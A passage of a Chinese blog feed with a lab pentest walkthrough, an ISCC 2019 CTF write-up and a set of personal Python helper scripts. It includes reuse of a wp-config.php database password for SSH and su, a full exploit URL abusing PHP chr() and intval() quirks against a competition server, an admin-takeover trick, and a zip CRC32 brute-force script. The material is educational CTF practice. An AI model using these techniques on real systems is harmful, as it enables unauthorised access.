                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>查看各个文件，信息收集<br><figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>并且在wp-config.php里找到了数据库密码，可以去连phpmyadmin了<br><figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>然而数据库里啥都打不开<br><figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>只能再试试wordpress里提到的username：togie，和刚才的password：12345，连一波ssh<br><figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>我的亲娘啊居然可以直接su！！</p>
]]></content>
      
        <categories>
            
            <category> 内网渗透 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ISCC misc+web wp]]></title>
      <url>/ctf-writeup/ckwd5ws81002qd0uce5nkzcto/</url>
      <content type="html"><![CDATA[<p>比赛网址:<br><a href="http://47.92.76.208:4000/challenges#" target="_blank" rel="noopener">http://47.92.76.208:4000/challenges#</a></p>
<h1 id="MISC-隐藏的信息"><a href="#MISC-隐藏的信息" class="headerlink" title="MISC   隐藏的信息"></a>MISC   隐藏的信息</h1><p>打开是一串数字<br>0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113<br>一眼过去没有数字8，推断是八进制，写个脚本转成ascil码再base64解码得<br>Well done!</p>
<p> Flag: ISCC{N0_0ne_can_st0p_y0u}<br>脚本如下（python2.7）：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">'0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113'</span></span><br><span class="line">a=a.split(<span class="string">' '</span>)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag+=chr(int(i,<span class="number">8</span>))</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="keyword">print</span> flag.decode(<span class="string">'base64'</span>)</span><br></pre></td></tr></table></figure></p>
<h1 id="MISC-最危险的地方就是最安全的地方"><a href="#MISC-最危险的地方就是最安全的地方" class="headerlink" title="MISC   最危险的地方就是最安全的地方"></a>MISC   最危险的地方就是最安全的地方</h1><p>拖进notepad发现有五十张图片，改后缀得到批量二维码<br><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>直接批量解码<br><figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>从50.jpg下手<br><figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>也有发现base64加密过的字符串  ZmxhZ3sxNWNDOTAxMn0=<br><figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{15cC9012}  错的？？为嘛？<br>赛后看了大佬的wp发现要去掉flag{}(笑笑不说话)</p>
<h1 id="MISC-他们能在一起吗？"><a href="#MISC-他们能在一起吗？" class="headerlink" title="MISC   他们能在一起吗？"></a>MISC   他们能在一起吗？</h1><p>打开是张二维码，扫描是串base64<br>UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=<br>解码  PASS%7B0K_I_L0V3_Y0u%21%7D<br>转义下  { =&gt; %7B   } =&gt; %7D  ! =&gt; %21<br>为  PASS{0K_I_L0V3_Y0u!}<br>下载图片，拖进notepad里发现有隐藏文件，改后缀rar，用上面的作为密码<br>得到flag  ISCC{S0rrY_W3_4R3_Ju5T_Fr1END}</p>
<h1 id="MISC-倒立屋"><a href="#MISC-倒立屋" class="headerlink" title="MISC   倒立屋"></a>MISC   倒立屋</h1><p><img src="./5.png" alt="图片"><br>stegsolve data extract提取像素得到文件头IsCc_201 9<br><figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>又因为是倒立屋，所以flag为9102_cCsI（居然没规定提交格式）</p>
<h1 id="MISC-Keyes’-secret"><a href="#MISC-Keyes’-secret" class="headerlink" title="MISC   Keyes’ secret"></a>MISC   Keyes’ secret</h1><p>打开是一大串大写字母，推测是凯撒加密，试了下没啥用，又查了资料发现应该是键盘密码，就划拉了一下……好难猜啊..枯辽.<br>QWERTY RFVGYHN WSXCDE MNBVCDRTGHU WSXCDE QWERTY </p>
<p>GRDXCVB MNBVCDRTGHU WSXCDE QWERTY</p>
<p>EFVT TGBNMJU YTGBNMJU MNBVCDRTGHU QWERTY </p>
<p>TRFVG WSXCVGRD XCVB CVGRED</p>
<p>{WSX IUYHNBV TRFVB TRFVB QWERTY   </p>
<p>QAZSCE WSXCDE EFVT  YHN MKJ TGBNMJUY GRDXCVB MNBVCDRTGHU WSXCFE QWERTY</p>
<p>TRFVB WSX NBVCXSWERF RFVGYHN WSXCDE MNBVCDRTGHU}<br>翻译过来应该是 FLAG{ISCC KEYBOARD CIPHER}</p>
<h1 id="MISC-Aesop’s-secret"><a href="#MISC-Aesop’s-secret" class="headerlink" title="MISC   Aesop’s secret"></a>MISC   Aesop’s secret</h1><p>附件里有张gif动图，提取帧，拼合成一张图片<br><figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>把gif用notepad打开，结尾有一串密文<br>U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw==<br>经检验是AES加密，密钥是ISCC<br>解密一次又得到一串密文<br>U2FsdGVkX18OvTUlZubDnmvk2lSAkb8Jt4Zv6UWpE7Xb43f8uzeFRUKGMo6QaaNFHZriDDV0EQ/qt38Tw73tbQ==<br>再次解密<br>得到 flag{DugUpADiamondADeepDarkMine}</p>
<h1 id="web-WEB3"><a href="#web-WEB3" class="headerlink" title="web   WEB3"></a>web   WEB3</h1><p>这个我是先注册一个admin的账号，弹窗显示exits，用户名太简单，就注册了一个adminadmin，密码是123456789，登陆进去后改密码为123456，修改成功，在换为admin登陆，得到flag<br><figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{48822a8a86bfe05ce92a518d98d137812}</p>
<h1 id="web-WEB1"><a href="#web-WEB1" class="headerlink" title="web   WEB1"></a>web   WEB1</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_ISCC2019'</span> &amp;&amp; intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>chr()函数，需要把username值转成ascil值，并且会自动取模mod256，所以在原ascil值上+256<br>intval()函数处理十六进制数有问题，但可以强制转换，为了满足条件利用漏洞传个小数<br>Hello w3lc0me_To_ISCC2019!<br>flag{8311873e241ccad54463eaa5d4efc1e9}<br>payload：<a href="http://39.100.83.188:8001/index.php?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x38eea" target="_blank" rel="noopener">http://39.100.83.188:8001/index.php?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x38eea</a></p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一些我常用的py脚本(持续更新)]]></title>
      <url>/%E8%84%9A%E6%9C%AC/ckwd5wsb2006xd0ucf8rnzis5/</url>
      <content type="html"><![CDATA[<h2 id="批处理修改文件后缀名-当前目录下"><a href="#批处理修改文件后缀名-当前目录下" class="headerlink" title="批处理修改文件后缀名(当前目录下)"></a>批处理修改文件后缀名(当前目录下)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##python批量更换后缀名</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 列出当前目录下所有的文件</span></span><br><span class="line">files = os.listdir(<span class="string">'.'</span>)</span><br><span class="line"><span class="comment">#print('files',files)</span></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">  portion = os.path.splitext(filename)</span><br><span class="line">  <span class="comment"># 如果后缀是.dat</span></span><br><span class="line">  <span class="keyword">if</span> portion[<span class="number">1</span>] == <span class="string">".filename"</span>: </span><br><span class="line">    <span class="comment"># 重新组合文件名和后缀名</span></span><br><span class="line">    newname = portion[<span class="number">0</span>] + <span class="string">".newname"</span> </span><br><span class="line">    os.rename(filename,newname)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="进制转换解码脚本"><a href="#进制转换解码脚本" class="headerlink" title="进制转换解码脚本"></a>进制转换解码脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> chardet</span><br><span class="line"></span><br><span class="line">a = <span class="string">b"\345\260\274\345\217\244\346\213\211\346\226\257\350\265\265\345\233\233"</span></span><br><span class="line"><span class="comment">#判断当前字符串的格式（编码类型）</span></span><br><span class="line">fencoding = chardet.detect(a)  </span><br><span class="line"></span><br><span class="line">print(fencoding)</span><br><span class="line"><span class="comment">#编码类型为打印出来的fencoding编码类型</span></span><br><span class="line">a = a.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="ascil码转字符串或解base64"><a href="#ascil码转字符串或解base64" class="headerlink" title="ascil码转字符串或解base64"></a>ascil码转字符串或解base64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ascil码转字符串或解base64</span></span><br><span class="line"><span class="comment"># import base64</span></span><br><span class="line">a=<span class="string">'102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125'</span></span><br><span class="line">a=a.split(<span class="string">' '</span>)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag=flag+chr(int(i))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># print flag.decode('base64')</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="完整base64解码-txt输入输出"><a href="#完整base64解码-txt输入输出" class="headerlink" title="完整base64解码(txt输入输出)"></a>完整base64解码(txt输入输出)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">f1 = open(<span class="string">'out1.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">f1.write(str(base64.b64decode(f.read())))</span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="批量crc32碰撞"><a href="#批量crc32碰撞" class="headerlink" title="批量crc32碰撞"></a>批量crc32碰撞</h2><p>注释:解压后是68个压缩包,拖进winhex分析,不是伪加密,hint提示是base64,每个文件是4b,所以每个bata.txt应该是4个字符,写脚本进行批量crc32碰撞<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                    s = a + b + c + d</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        <span class="comment">#print(s)</span></span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'out'</span> + str(i) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file,<span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line"><span class="comment">#dic = string.printable</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'out.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="批量图片爬取-百度"><a href="#批量图片爬取-百度" class="headerlink" title="批量图片爬取(百度)"></a>批量图片爬取(百度)</h2><p>需要不同人的需要在脚本目录下新建一个包含关键词的txt<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> error</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">numPicture = <span class="number">0</span></span><br><span class="line">file = <span class="string">''</span></span><br><span class="line">List = []</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> List</span><br><span class="line">    print(<span class="string">'正在检测图片总数，请稍等.....'</span>)</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> t &lt; <span class="number">1000</span>:</span><br><span class="line">        Url = url + str(t)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            Result = requests.get(Url, timeout=<span class="number">7</span>)</span><br><span class="line">        <span class="keyword">except</span> BaseException:</span><br><span class="line">            t = t + <span class="number">60</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = Result.text</span><br><span class="line">            pic_url = re.findall(<span class="string">'"objURL":"(.*?)",'</span>, result, re.S)  <span class="comment"># 先利用正则表达式找到图片url</span></span><br><span class="line">            s += len(pic_url)</span><br><span class="line">            <span class="keyword">if</span> len(pic_url) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                List.append(pic_url)</span><br><span class="line">                t = t + <span class="number">60</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recommend</span><span class="params">(url)</span>:</span></span><br><span class="line">    Re = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = requests.get(url)</span><br><span class="line">    <span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        bsObj = BeautifulSoup(html.text, <span class="string">'html.parser'</span>)</span><br><span class="line">        div = bsObj.find(<span class="string">'div'</span>, id=<span class="string">'topRS'</span>)</span><br><span class="line">        <span class="keyword">if</span> div <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            listA = div.findAll(<span class="string">'a'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> listA:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    Re.append(i.get_text())</span><br><span class="line">        <span class="keyword">return</span> Re</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dowmloadPicture</span><span class="params">(html, keyword)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="comment"># t =0</span></span><br><span class="line">    pic_url = re.findall(<span class="string">'"objURL":"(.*?)",'</span>, html, re.S)  <span class="comment"># 先利用正则表达式找到图片url</span></span><br><span class="line">    print(<span class="string">'找到关键词:'</span> + keyword + <span class="string">'的图片，即将开始下载图片...'</span>)</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> pic_url:</span><br><span class="line">        print(<span class="string">'正在下载第'</span> + str(num + <span class="number">1</span>) + <span class="string">'张图片，图片地址:'</span> + str(each))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> each <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                pic = requests.get(each, timeout=<span class="number">7</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> BaseException:</span><br><span class="line">            print(<span class="string">'错误，当前图片无法下载'</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            string = file + <span class="string">r'\\'</span> + keyword + <span class="string">'_'</span> + str(num) + <span class="string">'.jpg'</span></span><br><span class="line">            fp = open(string, <span class="string">'wb'</span>)</span><br><span class="line">            fp.write(pic.content)</span><br><span class="line">            fp.close()</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> num &gt;= numPicture:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  <span class="comment"># 主函数入口</span></span><br><span class="line">    word = input(<span class="string">"请输入搜索关键词(可以是人名，地名等): "</span>)</span><br><span class="line">    <span class="comment">#add = 'http://image.baidu.com/search/flip?tn=baiduimage&amp;ie=utf-8&amp;word=%E5%BC%A0%E5%A4%A9%E7%88%B1&amp;pn=120'</span></span><br><span class="line">    url = <span class="string">'http://image.baidu.com/search/flip?tn=baiduimage&amp;ie=utf-8&amp;word='</span> + word + <span class="string">'&amp;pn='</span></span><br><span class="line">    tot = Find(url)</span><br><span class="line">    Recommend = recommend(url)  <span class="comment"># 记录相关推荐</span></span><br><span class="line">    print(<span class="string">'经过检测%s类图片共有%d张'</span> % (word, tot))</span><br><span class="line">    numPicture = int(input(<span class="string">'请输入想要下载的图片数量 '</span>))</span><br><span class="line">    file = input(<span class="string">'请建立一个存储图片的文件夹，输入文件夹名称即可'</span>)</span><br><span class="line">    y = os.path.exists(file)</span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'该文件已存在，请重新输入'</span>)</span><br><span class="line">        file = input(<span class="string">'请建立一个存储图片的文件夹，)输入文件夹名称即可'</span>)</span><br><span class="line">        os.mkdir(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.mkdir(file)</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    tmp = url</span><br><span class="line">    <span class="keyword">while</span> t &lt; numPicture:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = tmp + str(t)</span><br><span class="line">            result = requests.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">            print(url)</span><br><span class="line">        <span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">'网络错误，请调整网络后重试'</span>)</span><br><span class="line">            t = t+<span class="number">60</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dowmloadPicture(result.text, word)</span><br><span class="line">            t = t + <span class="number">60</span></span><br><span class="line"> </span><br><span class="line">    print(<span class="string">'当前搜索结束，感谢使用'</span>)</span><br><span class="line">    print(<span class="string">'猜你喜欢'</span>)</span><br><span class="line">    <span class="keyword">for</span> re <span class="keyword">in</span> Recommend:</span><br><span class="line">        print(re, end=<span class="string">'  '</span>)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="统计字符频率"><a href="#统计字符频率" class="headerlink" title="统计字符频率"></a>统计字符频率</h2><p>统计一个文件里字符出现的频率<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"file.txt"</span>)</span><br><span class="line">txt = f.read()</span><br><span class="line">c = Counter()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line">    c[i] = c[i]+<span class="number">1</span></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure></p>
<hr>
